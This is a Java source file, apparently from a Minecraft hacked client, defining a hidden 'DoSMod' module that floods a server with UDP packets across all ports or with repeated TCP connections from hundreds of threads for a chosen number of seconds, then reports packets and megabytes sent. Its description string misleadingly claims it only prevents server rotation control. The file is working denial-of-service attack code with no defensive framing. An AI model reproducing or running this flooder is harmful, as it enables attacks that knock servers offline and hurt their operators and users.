package me.robbanrobbin.jigsaw.client.modules;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.Socket;
import java.net.SocketException;
import java.util.Random;
import java.util.concurrent.atomic.AtomicInteger;

import org.lwjgl.input.Keyboard;

import me.robbanrobbin.jigsaw.client.WaitTimer;
import me.robbanrobbin.jigsaw.client.main.Jigsaw;
import me.robbanrobbin.jigsaw.client.module.state.Category;
import me.robbanrobbin.jigsaw.gui.ScreenPos;
import me.robbanrobbin.jigsaw.module.Module;
import net.minecraft.client.multiplayer.ServerAddress;

public class DoSMod extends Module {

	public static volatile boolean flooding = false;

	public static volatile WaitTimer timer = new WaitTimer();

	public static AtomicInteger packetCount;
	
	public static int type;

	public DoSMod() {
		super("DoSMod", Keyboard.KEY_NONE, Category.HIDDEN, "Prevents the server from controlling your rotation.");
	}

	@Override
	public void onDisable() {

		super.onDisable();
	}

	@Override
	public void onEnable() {

		super.onEnable();
	}

	@Override
	public void onGui() {
		Jigsaw.getUIManager().addToQueue("§cDoS Attack: §r" + packetCount.get() + " packets sent!", ScreenPos.LEFTUP);
		if(type == 1) {
			Jigsaw.getUIManager().addToQueue(
					"§cDoS Attack: §r" + Math.round(((double) packetCount.get()) * 0.001) + " megabytes sent!",
					ScreenPos.LEFTUP);
		}
		super.onGui();
	}

	public static void startFlooding(final InetAddress addrrrrr, final byte[] bytes, final Random rand,
			final int time, final int type) {
		DoSMod.type = type;
		packetCount = new AtomicInteger();
		flooding = true;
		timer.reset();
		Jigsaw.getModuleByName("DoSMod").setToggled(true, true);
		final int port = ServerAddress.fromString(mc.getCurrentServerData().serverIP).getPort();
		Runnable floodRunnable = new Runnable() {

			@Override
			public void run() {
				final int port = rand.nextInt(65536);
				int iport = port;
				while (flooding) {
					if(type == 1) {
						if (iport == 65536) {
							iport = 0;
						}
						DatagramSocket sock;
						try {
							sock = new DatagramSocket();
							sock.send(new DatagramPacket(bytes, bytes.length, addrrrrr, iport));
							sock.close();
							packetCount.incrementAndGet();
						} catch (SocketException e1) {
							e1.printStackTrace();
						} catch (IOException e) {
							e.printStackTrace();
						}
						iport++;
					}
					if(type == 2) {
						try {
							Socket socket = new Socket(addrrrrr, port);
						}
						catch(IOException e) {
//							e.printStackTrace();
						}
						packetCount.incrementAndGet();
					}
					
				}
			}
		};

		for (int i = 0; i < ((type == 1) ? 500 : 1000); i++) {
			Thread thread = new Thread(floodRunnable);
			thread.start();
		}

		new Thread(new Runnable() {
			@Override
			public void run() {
				while (true) {
					try {
						Thread.sleep(1);
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
					if (timer.hasTimeElapsed(time * 1000, true)) {
						break;
					}
				}
				flooding = false;
				mc.addScheduledTask(new Runnable() {
					public void run() {
						Jigsaw.getModuleByName("DoSMod").setToggled(false, true);
						if(type == 1) {
							Jigsaw.chatMessage("UDP flooding complete, sent " + packetCount.get()
							+ " total packets (" + Math.round(((double) packetCount.get()) * 0.001)
							+ " Megabytes) in " + time + " seconds!");
						}
						if(type == 2) {
							Jigsaw.chatMessage("Experimental flooding complete, sent " + packetCount.get()
							+ " total handshakes packets in " + time + " seconds!");
						}
					}
				});
			}
		}).start();
	}

}
